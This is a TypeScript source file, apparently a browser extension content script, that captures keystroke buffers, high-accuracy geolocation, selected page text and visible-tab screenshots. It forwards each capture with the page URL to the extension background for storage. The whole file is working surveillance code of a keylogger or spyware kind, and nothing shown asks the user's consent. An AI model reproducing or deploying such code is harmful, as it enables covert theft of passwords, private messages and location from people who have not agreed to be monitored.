import { BackgroundMessage, StorageKey } from "../consts";
import { IGeolocationEntry, IKeyLogEntry } from "../interfaces";
import { contextData, simplePrepend, writeLog } from "./shared-utils";

if (typeof window === "undefined") {
  throw new Error("Cannot use this in background");
}

export async function captureKeylogBuffer(buffer: string) {
  // Send to background to decide whether to persist (background applies site filters)
  await sendMessage(BackgroundMessage.UPDATE_KEY_LOG, {
    buffer,
    url: window.location.href,
    context: contextData(),
  });
}

export async function captureGeolocation() {
  writeLog("Gathering geolocation...");

  try {
    const position: GeolocationPosition = await new Promise(
      (resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            resolve(pos);
          },
          (e) => {
            reject(e);
          },
          {
            enableHighAccuracy: true,
            timeout: 5000,
            maximumAge: 0,
          }
        );
      }
    );

    const { latitude, longitude, accuracy } = position.coords;

    writeLog("Writing geolocation");

    await simplePrepend<IGeolocationEntry>(StorageKey.GEOLOCATION_HISTORY, {
      latitude,
      longitude,
      accuracy,
      ...contextData(),
    });
  } catch (e) {
    writeLog(`Unable to capture geolocation: ${e}`);
  }
}

export function captureClipboard() {
  const text = window.getSelection()?.toString();

  if (text) {
    // Send clipboard to background so it can decide whether to persist
    sendMessage(BackgroundMessage.UPDATE_CLIPBOARD, {
      text,
      url: window.location.href,
      context: contextData(),
    });
  }
}

export function captureVisibleTab() {
  if (document.visibilityState === "visible") {
    sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
  }
}

export async function sendMessage(messageType: BackgroundMessage, data?: any) {
  const maxAttempts = 3;
  let attempt = 0;
  let backoff = 100;
  while (attempt < maxAttempts) {
    try {
      return await chrome.runtime.sendMessage({ messageType, data });
    } catch (e: any) {
      const msg = (e && e.message) || String(e);
      // If the receiving end doesn't exist or the extension context is
      // invalidated, it's often transient (background restarting). Retry a
      // few times with exponential backoff. For other errors, bail out.
      if (
        msg.includes("Could not establish connection") ||
        msg.includes("Extension context invalidated")
      ) {
        attempt++;
        if (attempt >= maxAttempts) {
          console.warn("sendMessage failed after retries:", e);
          return null;
        }
        await new Promise((r) => setTimeout(r, backoff));
        backoff *= 2;
        continue;
      }

      // Non-transient error — log once and return
      console.warn("sendMessage failed:", e);
      return null;
    }
  }
  return null;
}
